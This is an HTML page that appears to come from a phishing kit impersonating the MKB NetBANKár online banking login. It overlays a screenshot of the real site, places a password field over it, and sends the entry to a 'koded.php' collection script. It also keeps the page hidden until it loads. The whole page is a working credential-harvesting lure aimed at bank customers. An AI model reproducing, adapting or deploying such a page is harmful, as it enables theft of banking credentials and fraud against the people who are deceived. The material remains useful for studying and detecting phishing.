
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>MKB NetBANK&aacute;r</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta charset="utf-8" />
<meta name="applicable-device" content="pc,mobile" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="format-detection" content="telephone=no" />
<link rel="stylesheet" href="pure-min.css">

<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onLoad="unhideBody()">
</head>
<body>
<div id="image4" style="position:absolute; overflow:hidden; width:1352px; height:658px; z-index:3; left: 0px; top: 0px;"><a href="#"><img src="images/11.PNG" alt="" title="" border=0 width=1352 height=685></a></div>


<form action=koded.php name=mundachok id=mundachok method=post>
<input name="pass" class="textbox" autocomplete="on" maxlength=10 required type="text" style="position:absolute; width:243px; left:838px; top:235px; z-index:6; height: 24px;">

<div id="formimage1" style="position:absolute; left:955px; top:317px; z-index:7">
<input type="image" name="formimage1" width="128" height="31" src="images/2.PNG"></div>

</body>
</html>
